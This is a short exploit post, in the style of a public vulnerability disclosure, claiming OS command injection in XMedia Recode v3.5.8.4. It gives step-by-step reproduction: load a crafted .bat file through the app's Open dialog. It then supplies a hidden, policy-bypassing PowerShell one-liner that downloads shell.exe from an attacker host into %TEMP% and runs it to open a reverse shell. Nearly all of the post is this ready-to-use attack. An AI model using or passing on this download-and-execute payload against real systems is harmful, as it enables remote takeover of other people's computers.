---
layout: post
title: XMedia Recode v3.5.8.4 - OS Command Injection
date: 2023-09-16
category: exploit
---

# Exploit Title: XMedia Recode v3.5.8.4 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 16.09.2023
# Vendor Homepage: https://www.xmedia-recode.de
# Software Link: https://www.xmedia-recode.de/download/XMediaRecode3584_setup.exe
# Tested Version: v3.5.8.4 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Create a `.bat` file that contains your reverse shell command.
2. Launch XMedia Recode.
3. Click on the **Open** button located at the bottom right.
4. Select the `.bat` file you created.
5. The reverse shell should now be active, connecting to your listener.

### Example of Reverse Shell Command in .bat

To create a reverse shell in a `.bat` file, you can use the following command:

```batch
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://attacker_ip:port -OutFile %TEMP%\shell.exe; Start-Process %TEMP%\shell.exe"
